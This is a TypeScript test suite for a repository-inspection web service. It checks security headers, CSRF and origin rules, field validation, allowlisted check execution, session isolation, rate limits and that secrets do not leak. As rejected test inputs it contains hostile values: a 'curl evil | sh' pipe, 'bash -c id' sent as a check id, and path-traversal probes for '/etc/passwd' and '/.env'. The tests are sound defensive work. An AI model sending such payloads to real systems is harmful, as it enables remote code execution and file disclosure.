import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { startServer, Client, DEMO } from '../helpers/server.ts';
import type { TestServer } from '../helpers/server.ts';
import { FakeRunner } from '../helpers/fake-runner.ts';
import { GitHubError } from '../../src/github/client.ts';
import type { GitHubClient } from '../../src/github/client.ts';

let srv: TestServer;
const TOKEN = 'ghp_TESTSECRETTOKEN0123456789abcdefghijkl';

before(async () => {
  srv = await startServer({ env: { GITHUB_TOKEN: TOKEN } });
});
after(async () => srv.close());

async function inspected(c: Client, name = 'node-hello') {
  const r = await c.json('/api/inspect', { json: { url: DEMO(name) } });
  assert.equal(r.status, 200, JSON.stringify(r.data));
  return r.data;
}

async function startRun(c: Client, name = 'node-hello', checkId = 'node.npm-test') {
  const insp = await inspected(c, name);
  const r = await c.json('/api/runs', { json: { inspectionId: insp.id, checkId, acknowledged: true } });
  assert.equal(r.status, 201, JSON.stringify(r.data));
  return r.data.run;
}

async function waitDone(c: Client, id: string) {
  for (let i = 0; i < 200; i++) {
    const r = await c.json(`/api/runs/${id}`);
    if (r.data.run.terminal) return r.data;
    await new Promise((res) => setTimeout(res, 20));
  }
  throw new Error('run did not finish');
}

test('serves the UI with security headers and a session cookie', async () => {
  const c = new Client(srv.base);
  const res = await c.req('/');
  assert.equal(res.status, 200);
  const csp = res.headers.get('content-security-policy') ?? '';
  assert.match(csp, /script-src 'self'/);
  assert.match(csp, /frame-ancestors 'none'/);
  assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval/);
  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
  assert.match(c.cookie, /^rr_sid=/);
  const setCookie = (await new Client(srv.base).req('/api/config')).headers.get('set-cookie') ?? '';
  assert.match(setCookie, /HttpOnly/);
  assert.match(setCookie, /SameSite=Strict/);
  for (const p of ['/../package.json', '/public/app.js', '/src/server.ts', '/.env', '/%2e%2e/package.json']) {
    assert.equal((await c.req(p)).status, 404, p);
  }
});

test('config exposes runner status but never secrets', async () => {
  const c = new Client(srv.base);
  const r = await c.json('/api/config');
  assert.equal(r.status, 200);
  assert.equal(r.data.demo, true);
  assert.ok(r.data.examples.length >= 5);
  assert.equal(r.data.runner.available, true);
  assert.ok(!JSON.stringify(r.data).includes(TOKEN));
});

test('inspection: success, invalid URL, unknown repo and unsupported project', async () => {
  const c = new Client(srv.base);
  const ok = await inspected(c);
  assert.equal(ok.repo.fullName, 'reporadar-demo/node-hello');
  assert.match(ok.commit.sha, /^[a-f0-9]{40}$/);
  assert.equal(ok.checks.find((x: any) => x.id === 'node.npm-test').runnable, true);
  const bad = await c.json('/api/inspect', { json: { url: 'https://evil.example/a/b' } });
  assert.equal(bad.status, 400);
  assert.equal(bad.data.error.code, 'invalid_url');
  const missing = await c.json('/api/inspect', { json: { url: DEMO('does-not-exist') } });
  assert.equal(missing.status, 404);
  const unsupported = await inspected(c, 'makefile-only');
  assert.equal(unsupported.detection.status, 'unsupported');
  assert.equal(unsupported.checks.length, 0);
});

test('request hygiene: JSON only, strict fields, size cap, CSRF checks', async () => {
  const c = new Client(srv.base);
  await c.req('/api/config');
  let r = await c.json('/api/inspect', { body: `url=${DEMO('node-hello')}`, headers: { 'content-type': 'application/x-www-form-urlencoded' } });
  assert.equal(r.status, 415);
  r = await c.json('/api/inspect', { json: { url: DEMO('node-hello'), command: 'curl evil | sh' } });
  assert.equal(r.status, 400);
  assert.equal(r.data.error.code, 'unexpected_field');
  r = await c.json('/api/inspect', { json: { url: 'x'.repeat(10_000) } });
  assert.equal(r.status, 413);
  r = await c.json('/api/inspect', { body: '{not json', headers: { 'content-type': 'application/json' } });
  assert.equal(r.status, 400);
  r = await c.json('/api/inspect', { body: '[1]', headers: { 'content-type': 'application/json' } });
  assert.equal(r.status, 400);
  r = await c.json('/api/inspect', { json: { url: DEMO('node-hello') }, headers: { origin: 'https://evil.example' } });
  assert.equal(r.status, 403);
  r = await c.json('/api/inspect', { json: { url: DEMO('node-hello') }, headers: { 'sec-fetch-site': 'cross-site' } });
  assert.equal(r.status, 403);
  r = await c.json('/api/inspect', { json: { url: DEMO('node-hello') }, headers: { origin: srv.base } });
  assert.equal(r.status, 200);
  r = await c.json('/api/config', { method: 'DELETE' });
  assert.equal(r.status, 405);
});

test('runs: only allowlisted, proposed checks with explicit acknowledgement; no arbitrary commands', async () => {
  const c = new Client(srv.base);
  const insp = await inspected(c);
  const attempts: [unknown, number, string][] = [
    [{ inspectionId: insp.id, checkId: 'node.npm-test' }, 400, 'ack_required'],
    [{ inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: 'true' }, 400, 'ack_required'],
    [{ inspectionId: insp.id, checkId: 'bash -c id', acknowledged: true }, 400, 'unknown_check'],
    [{ inspectionId: insp.id, checkId: 'go.test', acknowledged: true }, 400, 'unknown_check'],
    [{ inspectionId: insp.id, checkId: 'node.npm-build', acknowledged: true }, 409, 'check_unavailable'],
    [{ inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: true, argv: ['sh'] }, 400, 'unexpected_field'],
    [{ inspectionId: 'nope', checkId: 'node.npm-test', acknowledged: true }, 400, 'invalid_inspection'],
    [{ inspectionId: 'a'.repeat(32), checkId: 'node.npm-test', acknowledged: true }, 404, 'inspection_expired'],
  ];
  for (const [body, status, code] of attempts) {
    const r = await c.json('/api/runs', { json: body });
    assert.equal(r.status, status, JSON.stringify(body));
    assert.equal(r.data.error.code, code, JSON.stringify(body));
  }
});

test('run lifecycle, log download, and history', async () => {
  const c = new Client(srv.base);
  const run = await startRun(c);
  assert.match(run.id, /^[a-f0-9]{32}$/);
  const done = await waitDone(c, run.id);
  assert.equal(done.run.state, 'succeeded');
  assert.ok(done.lines.some((l: any) => l.text === 'ok'));
  const log = await c.req(`/api/runs/${run.id}/log`);
  assert.equal(log.status, 200);
  assert.match(log.headers.get('content-type') ?? '', /^text\/plain/);
  assert.match(log.headers.get('content-disposition') ?? '', /^attachment/);
  assert.match(await log.text(), /Check passed/);
  const hist = await c.json('/api/runs');
  assert.equal(hist.data.runs[0].id, run.id);
});

test('authorization: another session cannot see, stream, download or cancel a run', async () => {
  const owner = new Client(srv.base);
  const intruder = new Client(srv.base);
  await intruder.req('/api/config');
  const runner = srv.runner as FakeRunner;
  runner.script = { hang: true };
  try {
    const run = await startRun(owner);
    for (const p of [`/api/runs/${run.id}`, `/api/runs/${run.id}/log`, `/api/runs/${run.id}/events`]) {
      assert.equal((await intruder.req(p)).status, 404, p);
    }
    assert.equal((await intruder.json(`/api/runs/${run.id}/cancel`, { json: {} })).status, 404);
    assert.deepEqual((await intruder.json('/api/runs')).data.runs, []);
    // The intruder cannot use the owner's inspection either.
    const insp = await inspected(owner);
    const r = await intruder.json('/api/runs', { json: { inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: true } });
    assert.equal(r.status, 404);
    // Forged / malformed ids
    assert.equal((await owner.req('/api/runs/../../etc/passwd')).status, 404);
    assert.equal((await owner.req(`/api/runs/${'z'.repeat(32)}`)).status, 404);
    const cancelled = await owner.json(`/api/runs/${run.id}/cancel`, { json: {} });
    assert.equal(cancelled.status, 202);
    const done = await waitDone(owner, run.id);
    assert.equal(done.run.state, 'cancelled');
  } finally {
    runner.script = { lines: ['ok\n'] };
  }
});

test('server-sent events stream state and log lines and end with the final result', async () => {
  const runner = srv.runner as FakeRunner;
  runner.script = { lines: ['first\n', '<b>not html</b>\n'], delayMs: 150 };
  try {
    const c = new Client(srv.base);
    const run = await startRun(c);
    const res = await c.req(`/api/runs/${run.id}/events`);
    assert.match(res.headers.get('content-type') ?? '', /text\/event-stream/);
    const text = await res.text(); // the server closes the stream at the end
    const events = [...text.matchAll(/event: (\w+)\ndata: (.*)\n/g)].map((m) => ({ type: m[1], data: JSON.parse(m[2] as string) }));
    assert.equal(events[0]?.type, 'state');
    assert.ok(events.some((e) => e.type === 'log' && e.data.lines.some((l: any) => l.text === '<b>not html</b>')));
    const end = events.at(-1);
    assert.equal(end?.type, 'end');
    assert.equal(end?.data.run.state, 'succeeded');
  } finally {
    runner.script = { lines: ['ok\n'] };
  }
});

test('execution disabled: inspection works, runs are refused with the reason', async () => {
  const off = new FakeRunner();
  off.statusOverride = { available: false, isolation: 'none', reason: 'Execution is disabled on this deployment.' };
  const s = await startServer({ runner: off });
  try {
    const c = new Client(s.base);
    const insp = (await c.json('/api/inspect', { json: { url: DEMO('node-hello') } })).data;
    const check = insp.checks.find((x: any) => x.id === 'node.npm-test');
    assert.equal(check.detected, true);
    assert.equal(check.runnable, false);
    assert.match(check.blockedReason, /disabled/);
    const r = await c.json('/api/runs', { json: { inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: true } });
    assert.equal(r.status, 503);
    assert.equal(off.executions, 0);
  } finally {
    await s.close();
  }
});

test('dependency-installing checks require the registry proxy', async () => {
  const r0 = new FakeRunner();
  r0.statusOverride = { dependencyFetch: false, dependencyFetchReason: 'No registry egress proxy is configured.' };
  const s = await startServer({ runner: r0 });
  try {
    const c = new Client(s.base);
    const insp = (await c.json('/api/inspect', { json: { url: DEMO('node-with-deps') } })).data;
    const check = insp.checks.find((x: any) => x.id === 'node.npm-test');
    assert.equal(check.installsDependencies, true);
    assert.equal(check.runnable, false);
    assert.equal(check.steps[0].network, 'registry-proxy');
    assert.ok(check.steps[0].argv.includes('--ignore-scripts'));
  } finally {
    await s.close();
  }
});

test('rate limits return 429 with Retry-After', async () => {
  const s = await startServer({ env: { REPORADAR_INSPECTIONS_PER_IP_PER_10_MIN: '2', REPORADAR_RUNS_PER_IP_PER_HOUR: '1' } });
  try {
    const c = new Client(s.base);
    const insp = await (async () => (await c.json('/api/inspect', { json: { url: DEMO('node-hello') } })).data)();
    await c.json('/api/inspect', { json: { url: DEMO('node-hello') } });
    const third = await c.json('/api/inspect', { json: { url: DEMO('node-hello') } });
    assert.equal(third.status, 429);
    assert.ok(Number(third.headers.get('retry-after')) > 0);
    const first = await c.json('/api/runs', { json: { inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: true } });
    assert.equal(first.status, 201);
    await waitDone(c, first.data.run.id);
    const second = await c.json('/api/runs', { json: { inspectionId: insp.id, checkId: 'node.npm-test', acknowledged: true } });
    assert.equal(second.status, 429);
  } finally {
    await s.close();
  }
});

test('GitHub failures map to clear errors; internal errors never leak details', async () => {
  const failing: GitHubClient = {
    kind: 'live',
    getRepo: async (owner) => {
      if (owner === 'limited') throw new GitHubError('rate_limited', 'GitHub rate limit reached. Try again later.', 42);
      if (owner === 'private') throw new GitHubError('not_public', 'This repository is not public.');
      throw new Error(`ENOENT /srv/secret/path ${TOKEN}`);
    },
    resolveBranch: async () => '',
    verifyCommit: async () => '',
    downloadArchive: async () => Buffer.alloc(0),
  };
  const s = await startServer({ github: failing });
  try {
    const c = new Client(s.base);
    const rl = await c.json('/api/inspect', { json: { url: 'https://github.com/limited/x' } });
    assert.equal(rl.status, 429);
    assert.equal(rl.headers.get('retry-after'), '42');
    const priv = await c.json('/api/inspect', { json: { url: 'https://github.com/private/x' } });
    assert.equal(priv.status, 404);
    const boom = await c.json('/api/inspect', { json: { url: 'https://github.com/boom/x' } });
    assert.equal(boom.status, 500);
    assert.ok(!JSON.stringify(boom.data).includes('/srv/secret'));
    assert.ok(!JSON.stringify(boom.data).includes(TOKEN));
  } finally {
    await s.close();
  }
});

test('a live inspection is not aborted by the request lifecycle, but is aborted when the client disconnects', async () => {
  let observedAbort = false;
  let release: () => void = () => {};
  const slow: GitHubClient = {
    kind: 'live',
    // Honours the abort signal like the real HTTP client does.
    getRepo: (_o, _r, signal) =>
      new Promise((resolve, reject) => {
        const t = setTimeout(
          () =>
            resolve({ owner: 'o', name: 'r', fullName: 'o/r', description: null, defaultBranch: 'main', language: null, htmlUrl: 'https://github.com/o/r', sizeKiB: 1, archived: false, fork: false }),
          signal?.aborted ? 0 : 200,
        );
        signal?.addEventListener('abort', () => {
          observedAbort = true;
          clearTimeout(t);
          release();
          reject(new GitHubError('timeout', 'aborted'));
        });
      }),
    resolveBranch: async () => 'b'.repeat(40),
    verifyCommit: async () => '',
    downloadArchive: async () => (await import('../helpers/tarbuilder.ts')).repoArchive({ 'go.mod': 'module x\ngo 1.21\n', 'x_test.go': 'package x' }),
  };
  const s = await startServer({ github: slow });
  try {
    const c = new Client(s.base);
    const ok = await c.json('/api/inspect', { json: { url: 'https://github.com/o/r' } });
    assert.equal(ok.status, 200, JSON.stringify(ok.data));
    assert.equal(observedAbort, false, 'reading the request body must not abort the inspection');

    const ac = new AbortController();
    const aborted = new Promise<void>((r) => (release = r));
    const p = fetch(`${s.base}/api/inspect`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', cookie: c.cookie },
      body: JSON.stringify({ url: 'https://github.com/o/r' }),
      signal: ac.signal,
    }).catch(() => undefined);
    setTimeout(() => ac.abort(), 50);
    await Promise.race([aborted, new Promise((r) => setTimeout(r, 2000))]);
    await p;
    assert.equal(observedAbort, true, 'client disconnect aborts upstream work');
  } finally {
    await s.close();
  }
});

test('an SSE stream stays open while the run is in progress', async () => {
  const runner = srv.runner as FakeRunner;
  runner.script = { lines: ['a\n'], delayMs: 800 };
  try {
    const c = new Client(srv.base);
    const run = await startRun(c);
    const started = Date.now();
    const res = await c.req(`/api/runs/${run.id}/events`);
    const text = await res.text();
    assert.ok(Date.now() - started >= 500, 'stream was not closed early');
    assert.match(text, /event: end/);
  } finally {
    runner.script = { lines: ['ok\n'] };
  }
});
